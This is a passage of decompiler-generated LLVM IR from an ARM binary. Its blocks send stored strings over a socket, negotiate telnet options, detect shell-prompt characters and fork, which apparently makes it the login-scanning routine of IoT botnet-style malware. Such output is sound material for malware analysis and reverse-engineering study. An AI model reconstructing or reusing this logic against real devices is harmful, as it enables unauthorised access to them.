  %v2_10e10 = inttoptr i32 %v1_10e10 to i32*
  %v3_10e10 = load i32, i32* %v2_10e10, align 4
  store i32 %v3_10e10, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_10e18 = add i32 %v0_10e10, 12
  %v3_10e18 = inttoptr i32 %v2_10e18 to i32*
  store i32 9, i32* %v3_10e18, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10e20:                               ; preds = %dec_label_pc_1088c
  %v1_10e20 = add i32 %v0_1088c, 24
  %v2_10e20 = inttoptr i32 %v1_10e20 to i32*
  %v3_10e20 = load i32, i32* %v2_10e20, align 4
  store i32 %v3_10e20, i32* %ip.global-to-local, align 4
  %v1_10e24 = add i32 %v3_10e20, -1
  store i32 %v1_10e24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e28 = icmp eq i32 %v1_10e24, 0
  store i1 %v2_10e28, i1* %cpsr_z.global-to-local, align 1
  %v5_10e2c = icmp sgt i32 %v1_10e24, 0
  br i1 %v5_10e2c, label %dec_label_pc_10e54, label %dec_label_pc_10810.backedge.thread

dec_label_pc_10e34:                               ; preds = %bb365
  %v2_10e34 = icmp ugt i8 %v3_10e58, 35
  store i1 %v2_10e34, i1* %cpsr_c.global-to-local, align 1
  %v7_10e34 = icmp eq i8 %v3_10e58, 36
  store i1 %v7_10e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e34, label %dec_label_pc_10e68, label %dec_label_pc_10e3c

dec_label_pc_10e3c:                               ; preds = %dec_label_pc_10e34
  %v2_10e3c = icmp ugt i8 %v3_10e58, 34
  store i1 %v2_10e3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e3c = icmp eq i8 %v3_10e58, 35
  store i1 %v7_10e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e3c, label %dec_label_pc_10e68, label %dec_label_pc_10e44

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e3c
  %v2_10e44 = icmp ugt i8 %v3_10e58, 36
  store i1 %v2_10e44, i1* %cpsr_c.global-to-local, align 1
  %v7_10e44 = icmp eq i8 %v3_10e58, 37
  store i1 %v7_10e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e44, label %dec_label_pc_10e68, label %dec_label_pc_10e4c

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e44
  %v1_10e4c = add i32 %v0_10e68, -1
  store i32 %v1_10e4c, i32* %r0.global-to-local, align 4
  %v2_10e4c = icmp ne i32 %v0_10e68, 0
  store i1 %v2_10e4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e4c = icmp eq i32 %v0_10e68, 1
  store i1 %v7_10e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e4c, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10e54

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10e20, %dec_label_pc_10e4c
  %v0_10e68 = phi i32 [ %v1_10e4c, %dec_label_pc_10e4c ], [ %v1_10e24, %dec_label_pc_10e20 ]
  %v2_10e54 = add i32 %v0_10e68, %v0_1088c
  store i32 %v2_10e54, i32* %r3.global-to-local, align 4
  %v1_10e58 = add i32 %v2_10e54, 28
  %v2_10e58 = inttoptr i32 %v1_10e58 to i8*
  %v3_10e58 = load i8, i8* %v2_10e58, align 1
  %v4_10e58 = zext i8 %v3_10e58 to i32
  store i32 %v4_10e58, i32* %r3.global-to-local, align 4
  %v2_10e5c = icmp ugt i8 %v3_10e58, 61
  store i1 %v2_10e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e5c = icmp eq i8 %v3_10e58, 62
  store i1 %v7_10e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e5c, label %dec_label_pc_10e68, label %bb365

bb365:                                            ; preds = %dec_label_pc_10e54
  %v3_10e60 = icmp ugt i8 %v3_10e58, 57
  store i1 %v3_10e60, i1* %cpsr_c.global-to-local, align 1
  %v8_10e60 = icmp eq i8 %v3_10e58, 58
  store i1 %v8_10e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e60, label %dec_label_pc_10e68, label %dec_label_pc_10e34

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e54, %bb365, %dec_label_pc_10e44, %dec_label_pc_10e3c, %dec_label_pc_10e34
  %v1_10e68 = add i32 %v0_10e68, 1
  store i32 %v1_10e68, i32* @r7, align 4
  %v2_10e6c = icmp eq i32 %v1_10e68, -1
  store i1 %v2_10e6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e6c = icmp eq i32 %v0_10e68, -2
  store i1 %v7_10e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e6c, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e68
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e74 = icmp eq i32 %v1_10e68, 0
  store i1 %v2_10e74, i1* %cpsr_z.global-to-local, align 1
  %tmp366 = icmp slt i32 %v1_10e68, 1
  br i1 %tmp366, label %dec_label_pc_10998, label %dec_label_pc_10e7c

dec_label_pc_10e7c:                               ; preds = %dec_label_pc_10e74
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10e80 = call i32 @function_11394(i32 10)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_10e90 = call i32 @function_112b0(i32 10, i32* nonnull %stack_var_-56)
  store i32 %v3_10e90, i32* %r0.global-to-local, align 4
  %v3_10e94 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10e94, i32* %r2.global-to-local, align 4
  store i32 %v3_10e90, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ea0 = load i32, i32* @r6, align 4
  %v1_10ea0 = add i32 %v0_10ea0, 4
  %v2_10ea0 = inttoptr i32 %v1_10ea0 to i32*
  %v3_10ea0 = load i32, i32* %v2_10ea0, align 4
  store i32 %v3_10ea0, i32* %r0.global-to-local, align 4
  %v4_10ea4 = inttoptr i32 %v3_10e90 to i32*
  %v5_10ea4 = call i32 @send(i32 %v3_10ea0, i32* %v4_10ea4, i32 %v3_10e94, i32 16384)
  store i32 %v5_10ea4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10eb4 = load i32, i32* @r6, align 4
  %v1_10eb4 = add i32 %v0_10eb4, 4
  %v2_10eb4 = inttoptr i32 %v1_10eb4 to i32*
  %v3_10eb4 = load i32, i32* %v2_10eb4, align 4
  store i32 %v3_10eb4, i32* %r0.global-to-local, align 4
  %v5_10eb8 = call i32 @send(i32 %v3_10eb4, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10ec0 = call i32 @function_112dc(i32 10)
  store i32 %v1_10ec0, i32* %r0.global-to-local, align 4
  %v0_10ec4 = load i32, i32* @r6, align 4
  %v1_10ec4 = add i32 %v0_10ec4, 24
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i32*
  %v3_10ec4 = load i32, i32* %v2_10ec4, align 4
  store i32 %v3_10ec4, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_10ecc = add i32 %v0_10ec4, 12
  %v3_10ecc = inttoptr i32 %v2_10ecc to i32*
  store i32 10, i32* %v3_10ecc, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_1088c
  %v1_10ed4 = add i32 %v0_1088c, 24
  %v2_10ed4 = inttoptr i32 %v1_10ed4 to i32*
  %v3_10ed4 = load i32, i32* %v2_10ed4, align 4
  store i32 %v3_10ed4, i32* %ip.global-to-local, align 4
  %v1_10ed8 = add i32 %v3_10ed4, -1
  store i32 %v1_10ed8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10edc = icmp eq i32 %v1_10ed8, 0
  store i1 %v2_10edc, i1* %cpsr_z.global-to-local, align 1
  %v5_10ee0 = icmp sgt i32 %v1_10ed8, 0
  br i1 %v5_10ee0, label %dec_label_pc_10f08, label %dec_label_pc_10810.backedge.thread

dec_label_pc_10ee8:                               ; preds = %bb367
  %v2_10ee8 = icmp ugt i8 %v3_10f0c, 35
  store i1 %v2_10ee8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ee8 = icmp eq i8 %v3_10f0c, 36
  store i1 %v7_10ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ee8, label %dec_label_pc_10f1c, label %dec_label_pc_10ef0

dec_label_pc_10ef0:                               ; preds = %dec_label_pc_10ee8
  %v2_10ef0 = icmp ugt i8 %v3_10f0c, 34
  store i1 %v2_10ef0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef0 = icmp eq i8 %v3_10f0c, 35
  store i1 %v7_10ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef0, label %dec_label_pc_10f1c, label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ef0
  %v2_10ef8 = icmp ugt i8 %v3_10f0c, 36
  store i1 %v2_10ef8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef8 = icmp eq i8 %v3_10f0c, 37
  store i1 %v7_10ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef8, label %dec_label_pc_10f1c, label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ef8
  %v1_10f00 = add i32 %v0_10f1c, -1
  store i32 %v1_10f00, i32* %r0.global-to-local, align 4
  %v2_10f00 = icmp ne i32 %v0_10f1c, 0
  store i1 %v2_10f00, i1* %cpsr_c.global-to-local, align 1
  %v7_10f00 = icmp eq i32 %v0_10f1c, 1
  store i1 %v7_10f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f00, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_10f00
  %v0_10f1c = phi i32 [ %v1_10f00, %dec_label_pc_10f00 ], [ %v1_10ed8, %dec_label_pc_10ed4 ]
  %v2_10f08 = add i32 %v0_10f1c, %v0_1088c
  store i32 %v2_10f08, i32* %r3.global-to-local, align 4
  %v1_10f0c = add i32 %v2_10f08, 28
  %v2_10f0c = inttoptr i32 %v1_10f0c to i8*
  %v3_10f0c = load i8, i8* %v2_10f0c, align 1
  %v4_10f0c = zext i8 %v3_10f0c to i32
  store i32 %v4_10f0c, i32* %r3.global-to-local, align 4
  %v2_10f10 = icmp ugt i8 %v3_10f0c, 61
  store i1 %v2_10f10, i1* %cpsr_c.global-to-local, align 1
  %v7_10f10 = icmp eq i8 %v3_10f0c, 62
  store i1 %v7_10f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f10, label %dec_label_pc_10f1c, label %bb367

bb367:                                            ; preds = %dec_label_pc_10f08
  %v3_10f14 = icmp ugt i8 %v3_10f0c, 57
  store i1 %v3_10f14, i1* %cpsr_c.global-to-local, align 1
  %v8_10f14 = icmp eq i8 %v3_10f0c, 58
  store i1 %v8_10f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f14, label %dec_label_pc_10f1c, label %dec_label_pc_10ee8

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_10f08, %bb367, %dec_label_pc_10ef8, %dec_label_pc_10ef0, %dec_label_pc_10ee8
  %v1_10f1c = add i32 %v0_10f1c, 1
  store i32 %v1_10f1c, i32* @r7, align 4
  %v2_10f20 = icmp eq i32 %v1_10f1c, -1
  store i1 %v2_10f20, i1* %cpsr_c.global-to-local, align 1
  %v7_10f20 = icmp eq i32 %v0_10f1c, -2
  store i1 %v7_10f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f20, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f28 = icmp eq i32 %v1_10f1c, 0
  store i1 %v2_10f28, i1* %cpsr_z.global-to-local, align 1
  %tmp368 = icmp slt i32 %v1_10f1c, 1
  br i1 %tmp368, label %dec_label_pc_10998, label %dec_label_pc_10f30

dec_label_pc_10f30:                               ; preds = %dec_label_pc_10f28
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10f34 = call i32 @function_11394(i32 6)
  store i32 %v2_10c78, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10f44 = call i32 @function_112b0(i32 6, i32* nonnull %stack_var_-48)
  store i32 %v3_10f44, i32* %r0.global-to-local, align 4
  %v3_10f48 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10f48, i32* %r2.global-to-local, align 4
  store i32 %v3_10f44, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f54 = load i32, i32* @r6, align 4
  %v1_10f54 = add i32 %v0_10f54, 4
  %v2_10f54 = inttoptr i32 %v1_10f54 to i32*
  %v3_10f54 = load i32, i32* %v2_10f54, align 4
  store i32 %v3_10f54, i32* %r0.global-to-local, align 4
  %v4_10f58 = inttoptr i32 %v3_10f44 to i32*
  %v5_10f58 = call i32 @send(i32 %v3_10f54, i32* %v4_10f58, i32 %v3_10f48, i32 16384)
  store i32 %v5_10f58, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f68 = load i32, i32* @r6, align 4
  %v1_10f68 = add i32 %v0_10f68, 4
  %v2_10f68 = inttoptr i32 %v1_10f68 to i32*
  %v3_10f68 = load i32, i32* %v2_10f68, align 4
  store i32 %v3_10f68, i32* %r0.global-to-local, align 4
  %v5_10f6c = call i32 @send(i32 %v3_10f68, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10f74 = call i32 @function_112dc(i32 6)
  store i32 %v1_10f74, i32* %r0.global-to-local, align 4
  %v0_10f78 = load i32, i32* @r6, align 4
  %v1_10f78 = add i32 %v0_10f78, 24
  %v2_10f78 = inttoptr i32 %v1_10f78 to i32*
  %v3_10f78 = load i32, i32* %v2_10f78, align 4
  store i32 %v3_10f78, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_10f80 = add i32 %v0_10f78, 12
  %v3_10f80 = inttoptr i32 %v2_10f80 to i32*
  store i32 8, i32* %v3_10f80, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10910
  store i32 ptrtoint (i32* @global_var_1231e.261 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_10f94, i32* %r0.global-to-local, align 4
  %v5_10f98 = call i32* @memcpy(i32* nonnull %stack_var_-41, i32* nonnull @global_var_1231e.261, i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_10fa4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_12315.263 to i32), i32* %r1.global-to-local, align 4
  %v5_10fac = call i32* @memcpy(i32* nonnull %stack_var_-73, i32* nonnull @global_var_12315.263, i32 9)
  %v7_10fac = ptrtoint i32* %v5_10fac to i32
  store i32 %v7_10fac, i32* %r0.global-to-local, align 4
  %v0_10fb0 = load i32, i32* @r6, align 4
  %v1_10fb0 = add i32 %v0_10fb0, 24
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i32*
  %v3_10fb0 = load i32, i32* %v2_10fb0, align 4
  store i32 %v3_10fb0, i32* %ip.global-to-local, align 4
  %v0_10fb4 = load i32, i32* @r5, align 4
  %v1_10fb4 = add i32 %v0_10fb4, 2
  store i32 %v1_10fb4, i32* %r2.global-to-local, align 4
  %v0_10fb8 = load i32, i32* %r8.global-to-local, align 4
  %v2_10fb8 = add i32 %v0_10fb8, %v3_10fb0
  store i32 %v2_10fb8, i32* %r3.global-to-local, align 4
  %v3_10fbc = icmp uge i32 %v2_10fb8, %v1_10fb4
  store i1 %v3_10fbc, i1* %cpsr_c.global-to-local, align 1
  %v9_10fbc = icmp eq i32 %v2_10fb8, %v1_10fb4
  store i1 %v9_10fbc, i1* %cpsr_z.global-to-local, align 1
  %v2_10fc0 = xor i1 %v3_10fbc, true
  %v3_10fc0 = or i1 %v9_10fbc, %v2_10fc0
  br i1 %v3_10fc0, label %dec_label_pc_10f88.dec_label_pc_10988.loopexit_crit_edge, label %dec_label_pc_10fc4

dec_label_pc_10f88.dec_label_pc_10988.loopexit_crit_edge: ; preds = %dec_label_pc_10f88
  %v0_10988.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10988

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10f88
  %v0_10fc4 = load i32, i32* @r4, align 4
  %v1_10fc4 = add i32 %v0_10fc4, 1
  %v2_10fc4 = inttoptr i32 %v1_10fc4 to i8*
  %v3_10fc4 = load i8, i8* %v2_10fc4, align 1
  %v4_10fc4 = zext i8 %v3_10fc4 to i32
  store i32 %v4_10fc4, i32* %r3.global-to-local, align 4
  %v2_10fc8 = icmp ugt i8 %v3_10fc4, 30
  store i1 %v2_10fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fc8 = icmp eq i8 %v3_10fc4, 31
  store i1 %v7_10fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc8, label %dec_label_pc_11154, label %dec_label_pc_10fd0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10fc4
  %v1_10fd0 = add i32 %v0_10fc4, -1
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i8*
  %v3_10fd0 = load i8, i8* %v2_10fd0, align 1
  %v4_10fd0 = zext i8 %v3_10fd0 to i32
  store i32 %v4_10fd0, i32* %r3.global-to-local, align 4
  %v2_10fd4 = icmp ugt i8 %v3_10fd0, -4
  store i1 %v2_10fd4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd4 = icmp eq i8 %v3_10fd0, -3
  store i1 %v7_10fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd4, label %bb369, label %dec_label_pc_10fe0

bb369:                                            ; preds = %dec_label_pc_10fd0
  %v1_10fd8 = load i32, i32* %sl.global-to-local, align 4
  %v2_10fd8 = trunc i32 %v1_10fd8 to i8
  store i8 %v2_10fd8, i8* %v2_10fd0, align 1
  %v0_10fdc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10fdc.pr, label %dec_label_pc_10924, label %.dec_label_pc_10fe0_crit_edge

.dec_label_pc_10fe0_crit_edge:                    ; preds = %bb369
  %v0_10fe0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %.dec_label_pc_10fe0_crit_edge, %dec_label_pc_10fd0
  %v0_10fe0 = phi i32 [ %v0_10fe0.pre, %.dec_label_pc_10fe0_crit_edge ], [ %v4_10fd0, %dec_label_pc_10fd0 ]
  %v2_10fe0 = icmp ugt i32 %v0_10fe0, 250
  store i1 %v2_10fe0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fe0 = icmp eq i32 %v0_10fe0, 251
  store i1 %v7_10fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fe0, label %bb370, label %dec_label_pc_10924

bb370:                                            ; preds = %dec_label_pc_10fe0
  store i32 -3, i32* %r2.global-to-local, align 4
  %v3_10fe8 = load i32, i32* @r4, align 4
  %v4_10fe8 = add i32 %v3_10fe8, -1
  %v5_10fe8 = inttoptr i32 %v4_10fe8 to i8*
  store i8 -3, i8* %v5_10fe8, align 1
  br label %dec_label_pc_10924

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10a74, %dec_label_pc_10a50, %dec_label_pc_10a90
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10ff4 = call i32 @function_11394(i32 28)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_11004 = call i32 @function_112b0(i32 28, i32* nonnull %stack_var_-56)
  %v3_11008 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11004, i32* %r2.global-to-local, align 4
  %v1_11010 = add i32 %v3_11008, -1
  store i32 %v1_11010, i32* %r3.global-to-local, align 4
  %v0_11014 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11014, i32* %r0.global-to-local, align 4
  %v0_11018 = load i32, i32* @r6, align 4
  %v1_11018 = add i32 %v0_11018, 24
  %v2_11018 = inttoptr i32 %v1_11018 to i32*
  %v3_11018 = load i32, i32* %v2_11018, align 4
  store i32 %v3_11018, i32* %r1.global-to-local, align 4
  %v4_1101c = call i32 @function_11aa0(i32 %v0_11014, i32 %v3_11018, i32 %v3_11004, i32 %v1_11010)
  store i32 %v4_1101c, i32* %r0.global-to-local, align 4
  %v1_11020 = add i32 %v4_1101c, 1
  store i32 %v1_11020, i32* @r7, align 4
  %v2_11020 = icmp eq i32 %v4_1101c, -1
  store i1 %v2_11020, i1* %cpsr_c.global-to-local, align 1
  %v7_11020 = icmp eq i32 %v1_11020, 0
  store i1 %v7_11020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11020, label %thread-pre-split100, label %bb371

bb371:                                            ; preds = %dec_label_pc_10ff0
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split100

thread-pre-split100:                              ; preds = %dec_label_pc_10ff0, %bb371
  %v0_11028 = phi i1 [ false, %bb371 ], [ true, %dec_label_pc_10ff0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_11028, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_111bc = call i32 @function_112dc(i32 28)
  store i32 %v1_111bc, i32* %r0.global-to-local, align 4
  br i1 %v0_11028, label %dec_label_pc_111b8, label %dec_label_pc_11030

dec_label_pc_11030:                               ; preds = %thread-pre-split100
  %v0_11038 = load i32, i32* @r7, align 4
  %v3_11038 = icmp eq i32 %v0_11038, -1
  store i1 %v3_11038, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11038, label %dec_label_pc_1080c.loopexit, label %dec_label_pc_10aa4

dec_label_pc_11044:                               ; preds = %dec_label_pc_10cc4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_11050 = call i32 @function_11394(i32 11)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_11060 = call i32 @function_112b0(i32 11, i32* nonnull %stack_var_-56)
  store i32 %v3_11060, i32* %r0.global-to-local, align 4
  %v3_11064 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11060, i32* %r2.global-to-local, align 4
  %v1_1106c = add i32 %v3_11064, -1
  store i32 %v1_1106c, i32* %r3.global-to-local, align 4
  %v0_11070 = load i32, i32* @r6, align 4
  %v1_11070 = add i32 %v0_11070, 24
  %v2_11070 = inttoptr i32 %v1_11070 to i32*
  %v3_11070 = load i32, i32* %v2_11070, align 4
  store i32 %v3_11070, i32* %r1.global-to-local, align 4
  %v0_11074 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11074, i32* %r0.global-to-local, align 4
  %v4_11078 = call i32 @function_11aa0(i32 %v0_11074, i32 %v3_11070, i32 %v3_11060, i32 %v1_1106c)
  store i32 %v4_11078, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_11084 = call i32 @function_112dc(i32 11)
  store i32 %v1_11084, i32* %r0.global-to-local, align 4
  %v0_11088 = load i32, i32* @r7, align 4
  %v2_11088 = icmp eq i32 %v0_11088, -1
  store i1 %v2_11088, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_11088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11088, label %dec_label_pc_1080c.loopexit, label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %dec_label_pc_11044
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11090 = icmp eq i32 %v0_11088, 0
  store i1 %v2_11090, i1* %cpsr_z.global-to-local, align 1
  %tmp372 = icmp slt i32 %v0_11088, 1
  br i1 %tmp372, label %dec_label_pc_10998, label %dec_label_pc_11098

dec_label_pc_11098:                               ; preds = %dec_label_pc_11090
  %v0_11098 = load i32, i32* @r6, align 4
  %v1_11098 = add i32 %v0_11098, 21
  %v2_11098 = inttoptr i32 %v1_11098 to i8*
  %v3_11098 = load i8, i8* %v2_11098, align 1
  %v4_11098 = zext i8 %v3_11098 to i32
  store i32 %v4_11098, i32* %r3.global-to-local, align 4
  %v1_1109c = add i32 %v0_11098, 20
  %v2_1109c = inttoptr i32 %v1_1109c to i8*
  %v3_1109c = load i8, i8* %v2_1109c, align 1
  %v4_1109c = zext i8 %v3_1109c to i32
  store i32 %v4_1109c, i32* %r2.global-to-local, align 4
  %v1_110a0 = add i32 %v0_11098, 16
  %v2_110a0 = inttoptr i32 %v1_110a0 to i32*
  %v3_110a0 = load i32, i32* %v2_110a0, align 4
  store i32 %v3_110a0, i32* %r1.global-to-local, align 4
  %v4_110a4 = mul nuw nsw i32 %v4_11098, 256
  %v5_110a4 = or i32 %v4_1109c, %v4_110a4
  store i32 %v5_110a4, i32* %r2.global-to-local, align 4
  %v1_110a8 = and i32 %v4_1109c, 128
  %v2_110a8 = icmp ne i32 %v1_110a8, 0
  store i1 %v2_110a8, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_11098, i32* %r3.global-to-local, align 4
  store i32 %v3_110a0, i32* %stack_var_-48, align 4
  store i32 %v5_110a4, i32* %stack_var_-38, align 4
  %v1_110b8 = inttoptr i32 %v0_11098 to i32*
  %v2_110b8 = load i32, i32* %v1_110b8, align 4
  store i32 %v2_110b8, i32* @sl, align 4
  %v0_110bc = call i32 @fork()
  store i32 %v0_110bc, i32* %r0.global-to-local, align 4
  %v2_110c0 = icmp eq i32 %v0_110bc, -1
  %.385 = zext i1 %v2_110c0 to i32
  store i32 %.385, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110cc = icmp eq i32 %v0_110bc, 0
  store i1 %v2_110cc, i1* %cpsr_z.global-to-local, align 1
  %tmp375 = icmp slt i32 %v0_110bc, 1
  br i1 %tmp375, label %bb376, label %.thread103

.thread103:                                       ; preds = %dec_label_pc_11098
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110e0

bb376:                                            ; preds = %dec_label_pc_11098
  store i32 %.385, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110d8 = icmp eq i1 %v2_110c0, false
  store i1 %v2_110d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110d8, label %dec_label_pc_11220, label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %.thread103, %bb376
  %v0_110e0 = load i32, i32* @r6, align 4
  %v1_110e0 = add i32 %v0_110e0, 4
  %v2_110e0 = inttoptr i32 %v1_110e0 to i32*
  %v3_110e0 = load i32, i32* %v2_110e0, align 4
  store i32 %v3_110e0, i32* %r0.global-to-local, align 4
  %v1_110e4 = call i32 @close(i32 %v3_110e0)
  store i32 %v1_110e4, i32* %r0.global-to-local, align 4
  %v0_110e8 = load i32, i32* @r6, align 4
  %v1_110e8 = add i32 %v0_110e8, 24
  %v2_110e8 = inttoptr i32 %v1_110e8 to i32*
  %v3_110e8 = load i32, i32* %v2_110e8, align 4
  store i32 %v3_110e8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_110f0 = load i32, i32* @r4, align 4
  %v2_110f0 = add i32 %v0_110e8, 4
  %v3_110f0 = inttoptr i32 %v2_110f0 to i32*
  store i32 %v0_110f0, i32* %v3_110f0, align 4
  %v0_110f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_110f4 = load i32, i32* @r6, align 4
  %v2_110f4 = add i32 %v1_110f4, 12
  %v3_110f4 = inttoptr i32 %v2_110f4 to i32*
  store i32 %v0_110f4, i32* %v3_110f4, align 4
  br label %dec_label_pc_10d48

dec_label_pc_110fc:                               ; preds = %dec_label_pc_10828
  br i1 %v2_1084c, label %dec_label_pc_111c8, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110fc
  %v3_11100 = icmp eq i32 %v5_10848, -1
  store i1 %v3_11100, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_11100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11100, label %dec_label_pc_11108, label %dec_label_pc_10874

dec_label_pc_11108:                               ; preds = %dec_label_pc_11100
  %v0_11108 = load i32, i32* @sb, align 4
  %v1_11108 = inttoptr i32 %v0_11108 to i32*
  %v2_11108 = load i32, i32* %v1_11108, align 4
  store i32 %v2_11108, i32* %r3.global-to-local, align 4
  %v2_1110c = icmp ugt i32 %v2_11108, 10
  store i1 %v2_1110c, i1* %cpsr_c.global-to-local, align 1
  %v7_1110c = icmp eq i32 %v2_11108, 11
  store i1 %v7_1110c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1110c, label %dec_label_pc_10644, label %dec_label_pc_11114

